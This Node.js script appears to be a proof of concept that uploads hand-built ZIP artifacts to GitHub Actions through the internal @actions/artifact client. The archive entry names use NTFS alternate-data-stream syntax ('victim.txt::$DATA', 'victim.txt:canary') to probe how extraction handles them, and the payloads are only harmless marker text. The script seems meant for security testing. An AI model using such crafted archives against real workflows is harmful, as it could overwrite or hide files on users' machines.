import {Readable} from 'node:stream'
import path from 'node:path'
import {pathToFileURL} from 'node:url'

const fromArtifact = relative =>
  pathToFileURL(path.resolve('node_modules/@actions/artifact', relative)).href
const {internalArtifactTwirpClient} = await import(
  fromArtifact('lib/internal/shared/artifact-twirp-client.js')
)
const {getBackendIdsFromToken} = await import(
  fromArtifact('lib/internal/shared/util.js')
)
const {uploadToBlobStorage} = await import(
  fromArtifact('lib/internal/upload/blob-upload.js')
)
const {StringValue} = await import(fromArtifact('lib/generated/index.js'))

const crcTable = Array.from({length: 256}, (_, n) => {
  let c = n
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
  return c >>> 0
})
const crc32 = buffer => {
  let crc = 0xffffffff
  for (const byte of buffer) crc = crcTable[(crc ^ byte) & 0xff] ^ (crc >>> 8)
  return (crc ^ 0xffffffff) >>> 0
}
const makeZip = (fileName, content) => {
  const name = Buffer.from(fileName)
  const data = Buffer.from(content)
  const checksum = crc32(data)
  const local = Buffer.alloc(30)
  local.writeUInt32LE(0x04034b50, 0)
  local.writeUInt16LE(20, 4)
  local.writeUInt16LE(0x0800, 6)
  local.writeUInt32LE(checksum, 14)
  local.writeUInt32LE(data.length, 18)
  local.writeUInt32LE(data.length, 22)
  local.writeUInt16LE(name.length, 26)
  const central = Buffer.alloc(46)
  central.writeUInt32LE(0x02014b50, 0)
  central.writeUInt16LE(0x0314, 4)
  central.writeUInt16LE(20, 6)
  central.writeUInt16LE(0x0800, 8)
  central.writeUInt32LE(checksum, 16)
  central.writeUInt32LE(data.length, 20)
  central.writeUInt32LE(data.length, 24)
  central.writeUInt16LE(name.length, 28)
  central.writeUInt32LE((0o100644 << 16) >>> 0, 38)
  const end = Buffer.alloc(22)
  end.writeUInt32LE(0x06054b50, 0)
  end.writeUInt16LE(1, 8)
  end.writeUInt16LE(1, 10)
  end.writeUInt32LE(central.length + name.length, 12)
  end.writeUInt32LE(local.length + name.length + data.length, 16)
  return Buffer.concat([local, name, data, central, name, end])
}

const cases = [
  {name: 'alias-ads-default', entry: 'victim.txt::$DATA', content: 'payload-ads-default\n'},
  {name: 'alias-ads-named', entry: 'victim.txt:canary', content: 'payload-ads-named\n'}
]
const backend = getBackendIdsFromToken()
const client = internalArtifactTwirpClient({maxAttempts: 1, retryIntervalMs: 1})

for (const item of cases) {
  const zip = makeZip(item.entry, item.content)
  const created = await client.CreateArtifact({
    workflowRunBackendId: backend.workflowRunBackendId,
    workflowJobRunBackendId: backend.workflowJobRunBackendId,
    name: item.name,
    mimeType: StringValue.create({value: 'application/zip'}),
    version: 7
  })
  const upload = await uploadToBlobStorage(
    created.signedUploadUrl,
    Readable.from([zip]),
    'application/zip'
  )
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: backend.workflowRunBackendId,
    workflowJobRunBackendId: backend.workflowJobRunBackendId,
    name: item.name,
    size: String(upload.uploadSize || zip.length),
    hash: StringValue.create({value: `sha256:${upload.sha256Hash}`})
  })
  if (!created.ok || !finalized.ok) throw new Error(`service rejected ${item.name}`)
  console.log(`${item.name} finalized as ${finalized.artifactId}`)
}
